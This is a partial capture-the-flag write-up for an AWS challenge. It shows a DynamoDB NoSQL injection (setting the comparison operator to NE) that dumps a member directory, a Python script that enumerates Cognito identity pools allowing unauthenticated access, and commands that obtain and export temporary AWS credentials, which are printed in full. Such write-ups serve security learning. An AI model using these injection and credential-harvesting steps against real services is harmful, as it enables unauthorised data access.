# Snappy Incognito Hackers (partial solution)

## Task

![todo](images/06-01.png)

> Your recon team has gained access to the Syndicate's member directory. Uncover the identities, roles, and access
levels of Syndicate members, a crucial step in dismantling their hierarchy.

## Solution

The application allows us to search for Syndicate members by full name or phone number:

![todo](images/06-02.png)

Check the payload sent by the application to the backend when we search for a member:

![todo](images/06-03.png)

For someone closely familiar with DynamoDB, it might be obvious that the application is vulnerable to NoSQL injection
due to the `comparison` field being controlled on the client side. Otherwise, it's also easy to see that the backend
application queries DynamoDB since it exposes a stack trace in the response when invalid input is provided to some 
of the payload fields:

![todo](images/06-04.png)

![todo](images/06-05.png)

So, we simply need to set the comparison operator to `NE` and set the value for `name` to something that doesn't exist
in the database in order to dump all the records:

```
➜  ~ curl -XPOST -H "Content-Type: application/json" https://88t0qt1808.execute-api.us-east-1.amazonaws.com/default/data -d '{"selection": "name", "value": "foobar", "comparison": "NE", "type": "S"}' | jq > syndicate.json
```

In total there are 30 records in the database, one per Syndicate member. Each record contains a Cognito identity pool
ID. Let's check which of these are valid and allow unauthenticated access:

```python
import json
import boto3

ci = boto3.client('cognito-identity')

syndicate = {}
with open('syndicate.json') as f:
    syndicate = json.load(f)

for member in syndicate['body']['Items']:
    pool_id = member['idPool']['S']

    try:
        id = ci.get_id(AccountId='816362139463', IdentityPoolId=pool_id)
        print(member)
    except:
        pass

```

The only valid identity pool is for `Liam Anderson`:

```
➜  export AWS_DEFAULT_REGION=us-east-1

➜  python3 find_valid_identity_pools.py                      
{'postalZip': '58671-39421', 'idPool': {'S': 'us-east-1:e1ecbb7a-be12-4b33-8d7e-6fc40eaf9276'}, 'district': 'Salzburg', 'employeeId': {'S': 'SYN-ORG-ADMIN'}, 'role': {'S': 'SyndicateDebuggerRole'}, 'address': 'Ap #497-8828 Dolor. Street', 'email': 'liam.anderson@synd1cat3.org', 'country': 'New Zealand', 'phone': '0788887134', 'name': 'Liam Anderson', 'gender': 'Male'}
```

We can get credentials for unauthenticated access to the identity pool:

```
➜  ~ aws cognito-identity get-credentials-for-identity --identity-id $(aws cognito-identity get-id --identity-pool-id us-east-1:e1ecbb7a-be12-4b33-8d7e-6fc40eaf9276 | jq -r .IdentityId) --no-cli-pager
{
    "IdentityId": "us-east-1:be12f9af-4713-c82a-a8b6-4685f8ef4ded",
    "Credentials": {
        "AccessKeyId": "ASIA34EXZV5D7LHTAP6V",
        "SecretKey": "fYady35eyXV14AVcGEaC64UaGSlBTrMql93hYIxE",
        "SessionToken": "IQoJb3JpZ2luX2VjECgaCXVzLWVhc3QtMSJIMEYCIQDQFrueiYgngJ0Wmue03TFpky/J5utiVqpoZOxpA9nEpQIhAMyThwjvxQk0f8aaUa2hIK1YXaeJFJ3azbYa2Qx4omNeKscFCBEQABoMODE2MzYyMTM5NDYzIgxBlejXXmhAg6/+lPMqpAUx8TbYP90XN+e2qbAMlxTVoeCAOGM1TPE8tzTOhIe2Rd+XbjRFqwDRLQvrMARoTHeU7kk3IwQMxeejo2L11h8Ue4ARuKCpar5IZAgu5ZPQcbTIvGf28aCJh8wRWxwgqlzN/byk/XXKjsiahUELCQJ/KFvydUuG8qzZ1hJFnH2Nn8XQ+29v4+AYiRRCZlToNbRcDyDzgw4wmZxrDU05cEtb9HUyu17vj8xu6KTo8LOiD4HkVE9FH6dKKMr5SOMJwQ3zhofgogru+Mxa0CT2e41oVQ/Ya4dAdXPLJ9onEq4hgGj0R/82PUdVdaMb3UDZ6n2wuw3725er5mWc55m7U+9wb7MOmkeTuYxAVQ3ygnQbhEJMG1CcFi2bflecUqiQHWSusRxqnzX71xVhd/EIksQOi1X8n02Vz98f0fegQLauqp0D9tjnkPSqY0OEMULzWyC+QRFYyqSSfBuH67cmzR9jjsoeqt7erQxE00yI/7PtkNlYXN0wW2+Sh45/R59Rw2VYNE+spxWKgUEWJpDmYnbGia+HpChmCBdEzFc5u3yIT3gm4AyxFHJtMbQceIQ/e21NEALVBGW7yFeGxTO7XwrTtg8Vch87sJiUgo7o4CpeqLoqFEWTGgiVb1op1Lqs0peFNHeZ7gJUqHCz5G+aTr3fYuT0N3gY31w6cxhAdL0LotnHYZv8A9Z8Rb/xGO5kQk72L6VuO+T/y/LxsOeUsVAeIYoDpMfZw6UJD2UTg9FEgdqdc9SfEIbj90D8tiGQujdIuXvBTtBdJDW3cH49wAf7p9gzU6LH76EiR+L8wA/LUlQnTGvk01nU2LKRSJ+IBY1O1gmEhO1ic95FuWnqa3skrnHq/lD8cAoYM75hG83z1KAOTNukZmtWshVu4VzQ6LdC3LRJMLaNzK4GOt4CToZMVr5ladgB22Ca2tsa5SQthb5ls9Jh09uesP2id5MFlV600mVP1ELwr4V75CzanATZ7CSiaVgr7HQcMkauqL82ub3h2Vyvxdljvv6zs5vRQyrxQKV7Eb4jxxiZ+5xHq1k7C1+pY64OVkaXEK9ZEKQnHL+ncUzoODnMXOei0BL/OeUu8EP2DuonNXXygTVS9Trv3am8aWzrFL61bK+AH3ZVtMbBassBTx+JX3ZSiB4taNjyE6grZ42pEbq5+Pbp4ZAq679A8Fi0EuVg6H2xZKf29w/EL5uvtEXbHjcxVvTi8iuTbIEck/VVnNJzpQS5mbxDxJbIaT47zYPw8SBCx7c2I5TBnSb5PmtK7EnJHOeB+cogx7LoURZ9htSzAoadOVmncdk2zti25FCIa/62SVenfWHtQA+dKtOEJxJl2EHT1mnWZ6CyBPim/mTLQhZT5eyURPZaJFSdxuY5Gjs=",
        "Expiration": "2024-02-19T00:43:50-08:00"
    }
}
```

```
➜  ~ export AWS_ACCESS_KEY_ID=ASIA34EXZV5D7LHTAP6V

➜  ~ export AWS_SECRET_ACCESS_KEY=fYady35eyXV14AVcGEaC64UaGSlBTrMql93hYIxE

➜  ~ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjECgaCXVzLWVhc3QtMSJIMEYCIQDQFrueiYgngJ0Wmue03TFpky/J5utiVqpoZOxpA9nEpQIhAMyThwjvxQk0f8aaUa2hIK1YXaeJFJ3azbYa2Qx4omNeKscFCBEQABoMODE2MzYyMTM5NDYzIgxBlejXXmhAg6/+lPMqpAUx8TbYP90XN+e2qbAMlxTVoeCAOGM1TPE8tzTOhIe2Rd+XbjRFqwDRLQvrMARoTHeU7kk3IwQMxeejo2L11h8Ue4ARuKCpar5IZAgu5ZPQcbTIvGf28aCJh8wRWxwgqlzN/byk/XXKjsiahUELCQJ/KFvydUuG8qzZ1hJFnH2Nn8XQ+29v4+AYiRRCZlToNbRcDyDzgw4wmZxrDU05cEtb9HUyu17vj8xu6KTo8LOiD4HkVE9FH6dKKMr5SOMJwQ3zhofgogru+Mxa0CT2e41oVQ/Ya4dAdXPLJ9onEq4hgGj0R/82PUdVdaMb3UDZ6n2wuw3725er5mWc55m7U+9wb7MOmkeTuYxAVQ3ygnQbhEJMG1CcFi2bflecUqiQHWSusRxqnzX71xVhd/EIksQOi1X8n02Vz98f0fegQLauqp0D9tjnkPSqY0OEMULzWyC+QRFYyqSSfBuH67cmzR9jjsoeqt7erQxE00yI/7PtkNlYXN0wW2+Sh45/R59Rw2VYNE+spxWKgUEWJpDmYnbGia+HpChmCBdEzFc5u3yIT3gm4AyxFHJtMbQceIQ/e21NEALVBGW7yFeGxTO7XwrTtg8Vch87sJiUgo7o4CpeqLoqFEWTGgiVb1op1Lqs0peFNHeZ7gJUqHCz5G+aTr3fYuT0N3gY31w6cxhAdL0LotnHYZv8A9Z8Rb/xGO5kQk72L6VuO+T/y/LxsOeUsVAeIYoDpMfZw6UJD2UTg9FEgdqdc9SfEIbj90D8tiGQujdIuXvBTtBdJDW3cH49wAf7p9gzU6LH76EiR+L8wA/LUlQnTGvk01nU2LKRSJ+IBY1O1gmEhO1ic95FuWnqa3skrnHq/lD8cAoYM75hG83z1KAOTNukZmtWshVu4VzQ6LdC3LRJMLaNzK4GOt4CToZMVr5ladgB22Ca2tsa5SQthb5ls9Jh09uesP2id5MFlV600mVP1ELwr4V75CzanATZ7CSiaVgr7HQcMkauqL82ub3h2Vyvxdljvv6zs5vRQyrxQKV7Eb4jxxiZ+5xHq1k7C1+pY64OVkaXEK9ZEKQnHL+ncUzoODnMXOei0BL/OeUu8EP2DuonNXXygTVS9Trv3am8aWzrFL61bK+AH3ZVtMbBassBTx+JX3ZSiB4taNjyE6grZ42pEbq5+Pbp4ZAq679A8Fi0EuVg6H2xZKf29w/EL5uvtEXbHjcxVvTi8iuTbIEck/VVnNJzpQS5mbxDxJbIaT47zYPw8SBCx7c2I5TBnSb5PmtK7EnJHOeB+cogx7LoURZ9htSzAoadOVmncdk2zti25FCIa/62SVenfWHtQA+dKtOEJxJl2EHT1mnWZ6CyBPim/mTLQhZT5eyURPZaJFSdxuY5Gjs=

➜  ~ aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AROA34EXZV5DXYQUMDHLQ:CognitoIdentityCredentials",
    "Account": "816362139463",
    "Arn": "arn:aws:sts::816362139463:assumed-role/SyndicateOrderRole6/CognitoIdentityCredentials"
}
```

It wasn't possible to assume the `SyndicateDebuggerRole` IAM role with the credentials obtained from the identity pool,
though. I tried a myriad of things against Cognito, but had no luck.

One interesting thing I noticed is that the `SyndicateOrderRole6` role has access to the `recondatabucket` S3 bucket
from the second challenge. I'm not sure if this was a rabbit hole or a valid lead.
